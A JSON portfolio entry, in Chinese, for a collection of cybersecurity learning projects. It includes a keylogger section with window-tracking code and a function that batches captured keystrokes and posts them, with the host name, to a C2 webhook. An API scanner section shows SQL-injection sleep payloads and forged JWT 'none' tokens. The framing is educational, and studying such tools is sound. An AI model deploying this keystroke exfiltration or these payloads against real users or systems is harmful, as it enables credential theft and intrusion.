{
  "slug": "cybersecurity-projects",
  "language": "zh",
  "title": "60 个网络安全项目",
  "subtitle": "用于学习、克隆和构建作品集的实践安全项目",
  "description": "一个不断增长的 60 个网络安全项目合集，从入门级 CLI 工具到高级全栈应用都有。5 个项目已完全构建并有完整源代码；其余 55 个有详细的实现指南，我正在积极构建中，也欢迎贡献者。将它们克隆为模板、研究模式，或为你自己的作品集定制。",
  "tech_stack": [
    "Python",
    "TypeScript",
    "Haskell",
    "Lua",
    "React",
    "SolidJS",
    "FastAPI",
    "Flask",
    "SQLAlchemy",
    "SQLModel",
    "PostgreSQL",
    "SurrealDB",
    "Redis",
    "Docker",
    "Nginx",
    "SCSS",
    "TailwindCSS",
    "Vite"
  ],
  "github_url": "https://github.com/CarterPerez-dev/Cybersecurity-Projects",
  "demo_url": null,
  "website_url": null,
  "docs_url": null,
  "blog_url": null,
  "pypi_url": null,
  "npm_url": null,
  "ios_url": null,
  "android_url": null,
  "code_snippet": null,
  "code_language": null,
  "code_filename": null,
  "thumbnail_url": "project-cyber-projects/thumbnail.webp",
  "banner_url": "project-cyber-projects/banner.webp",
  "screenshots": null,
  "stars_count": 105,
  "forks_count": 11,
  "downloads_count": null,
  "users_count": null,
  "display_order": 2,
  "is_complete": false,
  "is_featured": true,
  "status": "active",
  "start_date": "2025-12-07",
  "end_date": null,
  "technical_details": "## 键盘记录器\n\n**类别：** 中级 | **状态：** 完成\n\n一个为安全研究和渗透测试培训构建的教育性键盘记录器。该项目展示了真实恶意软件如何通过键盘钩子、活动窗口上下文和命令与控制（C2）渗出来捕获凭据。技术上有趣的是跨平台窗口跟踪和模拟实际 APT 通信模式的批量 webhook 传递。\n\n### 工作原理\n\n键盘记录器使用 pynput 的事件驱动模型来钩入操作系统级别的键盘事件。当按键被按下时，它被处理成一个 `KeyEvent` 数据类，捕获时间戳、按键表示和活动窗口上下文。事件流经三个子系统：`LogManager` 处理带自动轮换的文件 I/O，`WebhookDelivery` 缓冲事件以进行批量 C2 传递，`WindowTracker` 提供特定于平台的窗口标题检测。所有东西都是线程安全的，用锁保护共享状态。\n\n```python\n@staticmethod\ndef get_active_window() -> str | None:\n    system = platform.system()\n\n    if system == \"Windows\" and win32gui:\n        return WindowTracker._get_windows_window()\n    if system == \"Darwin\" and NSWorkspace:\n        return WindowTracker._get_macos_window()\n    if system == \"Linux\":\n        return WindowTracker._get_linux_window()\n\n    return None\n\n@staticmethod\ndef _get_windows_window() -> str | None:\n    try:\n        window = win32gui.GetForegroundWindow()\n        _, pid = win32process.GetWindowThreadProcessId(window)\n        process = psutil.Process(pid)\n        window_title = win32gui.GetWindowText(window)\n        return f\"{process.name()} - {window_title}\" if window_title else process.name()\n    except Exception:\n        return None\n```\n\nWindowTracker 抽象了操作系统差异。Windows 使用 win32gui 配合 psutil 获取进程名，macOS 使用 NSWorkspace，Linux 调用 xdotool。窗口检查被限制在 500ms 间隔以避免频繁调用操作系统 API。\n\n### 技术决策\n\n- pynput 优于 pyHook/keyboard：开箱即用的跨平台支持，无需为 Windows/Linux 单独实现\n- 用 Dataclass 做 KeyEvent 和 Config：干净地序列化为 JSON 用于 webhook 载荷，准不可变配置\n- 批量 webhook 传递：事件缓冲直到达到批量大小（默认 50），模仿避免每次按键都发送信标的真实 C2 流量模式\n- 按大小轮换日志：防止长时间捕获时磁盘耗尽，默认在 5MB 时轮换\n- Threading.Event 做状态：`is_running` 和 `is_logging` 标志允许干净关闭和 F9 切换而无竞态条件\n\n```python\ndef _deliver_batch(self) -> None:\n    if not self.event_buffer or not self.config.webhook_url:\n        return\n\n    payload = {\n        \"timestamp\": datetime.now().isoformat(),\n        \"host\": platform.node(),\n        \"events\": [event.to_dict() for event in self.event_buffer]\n    }\n\n    try:\n        response = requests.post(\n            self.config.webhook_url,\n            json = payload,\n            timeout = 5\n        )\n        if response.status_code == 200:\n            self.event_buffer.clear()\n    except Exception as e:\n        logging.error(\"Webhook delivery failed: %s\", e)\n```\n\nwebhook 传递包含主机名用于受害者识别，将事件批量打包到单个载荷中，并且只在成功传递时清空缓冲区。失败的传递会保留事件以便重试，这就是真实恶意软件如何在网络中断时保持持久性的。\n\n### 技术栈\nPython 3.13+、pynput、requests、win32gui/psutil（Windows）、pyobjc（macOS）、xdotool（Linux）\n\n---\n\n## DNS 查询工具\n\n**类别：** 中级 | **状态：** 完成\n\n一个专业的 DNS 查询 CLI，超越简单查询。该工具执行多记录查询、反向查找、批量处理和 WHOIS 获取，带有 Rich 终端输出。突出的功能是 DNS 追踪，它可视化从根服务器到 TLD 服务器再到权威名称服务器的完整解析路径，展示 DNS 委派的确切工作方式。\n\n### 工作原理\n\n解析器使用 dnspython 的异步功能并发查询多种记录类型。对于标准查询，它为每个请求的记录类型并行发起查询并聚合结果。对于追踪，它手动实现迭代解析，从根服务器开始，沿着 NS 引用向下追踪层次结构，直到到达权威答案。\n\nCLI 层使用 Typer 配合 Rich 集成，在查询期间提供进度旋转器和格式化的输出表格。结果可以导出为 JSON 用于脚本，或以颜色编码的记录类型和人类可读的 TTL 格式显示。\n\n```python\nwhile True:\n    server_name, server_ip = current_servers[0]\n    query = dns.message.make_query(name, rdtype)\n    response = dns.query.udp(query, server_ip, timeout=3.0)\n\n    if response.answer:\n        for rrset in response.answer:\n            for rdata in rrset:\n                result.final_answer = str(rdata)\n        result.hops.append(TraceHop(\n            zone=current_zone, server=server_name,\n            server_ip=server_ip,\n            response=f\"{record_type}: {result.final_answer}\",\n            is_authoritative=True,\n        ))\n        break\n\n    if response.authority:\n        # 提取 NS 记录并跟随引用\n        glue_ips = {str(rrset.name).rstrip(\".\"): rdata.address\n                    for rrset in response.additional\n                    if rrset.rdtype == dns.rdatatype.A\n                    for rdata in rrset}\n```\n\n这是 trace 命令的核心。它通过向每个级别发送查询并跟随引用来手动遍历 DNS 层次结构，在可用时处理 glue 记录，否则解析名称服务器 IP。\n\n### 技术决策\n\n- 选择迭代解析而非递归以展示实际的委派链，而不仅仅是获得最终答案\n- 使用 `asyncio.gather` 配合 `return_exceptions=True` 来在批量查询中优雅地处理部分失败，而不会终止整个操作\n- 实现了 TTL 格式化，可在秒、分钟、小时和天之间自动缩放以提高可读性\n- 将输出格式化与解析逻辑完全分离，使 JSON 导出变得简单\n\n```python\nasync def batch_lookup(\n    domains: list[str],\n    record_types: list[RecordType] | None = None,\n    nameserver: str | None = None,\n    timeout: float = 5.0,\n) -> list[DNSResult]:\n    tasks = [lookup(domain, record_types, nameserver, timeout) \n             for domain in domains]\n    return await asyncio.gather(*tasks)\n```\n\n批量查询是并发展开而不是顺序执行的，所以查询 100 个域名花费的时间大约和查询一个一样长。\n\n### 技术栈\nPython 3.13、dnspython、Typer、Rich、python-whois、pytest、mypy、ruff\n\n---\n\n## 全栈 API 安全扫描器\n\n**类别：** 中级 | **状态：** 完成\n\n一个 Docker 化的安全测试平台，扫描 API 以查找映射到 OWASP API Security Top 10 的常见漏洞。扫描器协调四个专门模块，涵盖速率限制、认证缺陷、SQL 注入和 IDOR/BOLA 漏洞。技术上有趣的是用于盲漏洞检测的统计方法，以及防止扫描器本身造成服务中断的生产安全请求处理。\n\n### 工作原理\n\n后端遵循分层架构，FastAPI 处理路由，服务层协调业务逻辑，仓库层抽象数据库操作。每个漏洞扫描器都继承自 BaseScanner 类，该类提供常见的 HTTP 功能，包括请求间隔、带指数退避的重试逻辑和证据收集。当启动扫描时，ScanService 实例化请求的扫描器类，顺序执行它们，并通过仓库层持久化结果。\n\n扫描器模块根据漏洞类型实现不同的检测策略。基于错误的 SQLi 在响应中查找数据库签名。基于布尔的检测比较真假注入条件之间的响应长度。基于时间的盲检测使用多个样本建立基线响应时间，然后使用统计分析来识别由 sleep 载荷引起的延迟，同时最小化误报。认证扫描器测试缺失认证、JWT none 算法接受和签名验证绕过。\n\n```python\ndef _test_time_based_sqli(self, delay_seconds: int = 5) -> dict[str, Any]:\n    try:\n        baseline_mean, baseline_stdev = self.get_baseline_timing(\"/\")\n        threshold = baseline_mean + (3 * baseline_stdev)\n        expected_delay_time = baseline_mean + delay_seconds\n\n        delay_payloads = {\n            \"mysql\": [p for p in all_time_payloads if \"SLEEP\" in p],\n            \"postgres\": [p for p in all_time_payloads if \"pg_sleep\" in p],\n            \"mssql\": [p for p in all_time_payloads if \"WAITFOR\" in p],\n        }\n\n        for db_type, payloads in delay_payloads.items():\n            for payload in payloads:\n                delay_times = []\n                for _ in range(3):\n                    response = self.make_request(\"GET\", f\"/?id={payload}\", timeout=delay_seconds + 10)\n                    delay_times.append(getattr(response, \"request_time\", 0.0))\n                    time.sleep(1)\n\n                avg_delay = statistics.mean(delay_times)\n                if avg_delay >= expected_delay_time - 1:\n                    return {\"vulnerable\": True, \"database_type\": db_type, \"confidence\": \"HIGH\" if avg_delay >= expected_delay_time else \"MEDIUM\"}\n```\n\n这个基于时间的 SQLi 检测使用统计基线而不是硬编码阈值，在测试跨 MySQL、PostgreSQL 和 MSSQL 语法变体的延迟载荷之前，采集多个样本来建立正常响应方差。\n\n### 技术决策\n\n- 为扫描器使用抽象基类模式，这样像速率限制和重试处理这样的通用 HTTP 逻辑放在一个地方，而每种漏洞类型实现自己的检测策略\n- 实现了带可配置抖动的请求间隔，以避免在扫描期间压垮目标或触发速率限制，基于最大请求数和时间窗口动态计算\n- JWT 测试涵盖 none 算法的大小写变体，因为某些实现只检查小写，还有签名移除和畸形 token 接受\n- 速率限制绕过测试包括通过 X-Forwarded-For 和 X-Real-IP 的 IP 头欺骗，以及有时可以绕过大小写敏感速率限制器的端点路径变体\n- 前端使用 Zustand 配合 immer 进行不可变状态更新，以及持久化中间件在会话间保留表单状态，七天后自动过期\n- 类型守卫在数据进入应用状态之前在运行时验证所有 API 响应，及早捕获后端契约违规\n\n```python\ndef _test_none_algorithm(self) -> dict[str, Any]:\n    try:\n        header, payload, signature = self.auth_token.split(\".\")\n        none_variants = AuthPayloads.get_jwt_none_variants()  # [\"none\", \"None\", \"NONE\", \"nOnE\", ...]\n\n        for variant in none_variants:\n            malicious_header = self._base64url_encode(json.dumps({\"alg\": variant, \"typ\": \"JWT\"}))\n            malicious_token = f\"{malicious_header}.{payload}.\"\n\n            response = self.make_request(\"GET\", \"/\", headers={\"Authorization\": f\"Bearer {malicious_token}\"})\n            if response.status_code == 200:\n                return {\"vulnerable\": True, \"vulnerability_type\": \"JWT None Algorithm\", \"algorithm_variant\": variant}\n\n        return {\"vulnerable\": False, \"description\": \"None algorithm properly rejected\"}\n    except Exception as e:\n        return {\"vulnerable\": False, \"error\": str(e)}\n```\n\nJWT none 算法测试构造带有各种「none」大小写排列作为算法的 token，去掉签名，并检查 API 是否接受它们。易受攻击的端点会返回 200，表明它处理无签名的 token。\n\n### 技术栈\nPython、FastAPI、SQLAlchemy、PostgreSQL、React、TypeScript、Zustand、TanStack Query、Docker、Nginx\n\n---\n\n## FastAPI-420（API 速率限制器）\n\n**类别：** 高级 | **状态：** 完成\n\n一个生产级的 FastAPI 速率限制库，实现三层防御系统来对抗 API 滥用和 DDoS 攻击。名称中的「420」引用了 Twitter 旧的 HTTP 420「Enhance Your Calm」响应代码，该库重新使用它而不是标准的 429。技术上有趣的是几个难题的汇聚：通过 Lua 脚本实现的原子分布式计数器、考虑 IPv6 /64 前缀利用的复杂客户端指纹识别、具有多种防御模式的断路器模式，以及让你可以在不触碰应用代码的情况下交换算法和存储后端的干净抽象层。整个库端到端都有类型，带有运行时可检查的 protocol，并附带阻塞中间件和一个添加渐进延迟而不是硬拒绝的「slow down」变体。\n\n### 工作原理\n\n架构在三个防御层上运行，请求必须依次通过。第 1 层使用从 IP 地址、用户代理、认证令牌以及可选的 TLS 指纹和头部顺序构建的复合指纹来处理每用户每端点限制。第 2 层通过对每个路由应用全局限制来保护单个端点不被压垮，这样单个端点不能消耗所有可用容量。第 3 层是一个断路器，监控总 API 流量，当超过阈值时可以触发进入不同的防御模式。\n\n分层防御协调器通过所有三层处理请求，并在第一次失败时抛出 `EnhanceYourCalm` 异常（HTTP 420）。每层使用结构化格式构建自己的速率限制键：`{prefix}:{version}:{layer}:{endpoint}:{identifier}:{window}`。这种键结构意味着你可以在调试期间直接检查 Redis，并立即理解你在看什么。\n\n该库支持四种速率限制算法，它们都实现相同的 `BaseAlgorithm` 抽象类：滑动窗口使用两个固定窗口之间的加权插值，每个客户端以 O(1) 内存实现约 99.997% 的精度；令牌桶允许在执行平均速率的同时进行受控突发直到桶容量；固定窗口更简单但存在边界突发问题；漏桶是滑动窗口的别名，因为对于大多数用例，实现在功能上是等效的。\n\n### 技术栈\nPython 3.12+、FastAPI、Starlette、Redis、Pydantic、Pydantic Settings、PyJWT、Lua、asyncio、mypy（严格模式）、ruff、pylint\n\n---\n\n## 加密 P2P 聊天\n\n**类别：** 高级 | **状态：** 进行中\n\n端到端加密消息的 Signal Protocol 完整实现，从零开始构建，没有加密捷径。系统实现 X3DH（扩展三重 Diffie-Hellman）用于异步密钥交换，以及 Double Ratchet 算法用于前向保密，这意味着每条消息都使用通过一系列加密操作派生的唯一加密密钥。认证完全通过 WebAuthn/FIDO2 passkey 实现无密码化，完全消除凭据数据库。\n\n架构使用三个数据库，每个都针对其特定角色进行了优化：PostgreSQL 处理用户身份和凭据存储，具有 ACID 保证；SurrealDB 提供带有原生 live query 的实时文档存储，用于即时消息传递；Redis 管理带有自动 TTL 过期的临时 WebAuthn 挑战。前端使用 SolidJS 而不是 React 构建，使用细粒度响应性来实现更小的包体积和在实时消息上下文中更好的性能。\n\n### 技术栈\nPython 3.13、FastAPI、SQLModel、PostgreSQL、SurrealDB、Redis、WebAuthn（py_webauthn）、cryptography、SolidJS、TypeScript、Tailwind CSS、Nanostores、Web Crypto API、Docker、Nginx\n"
}
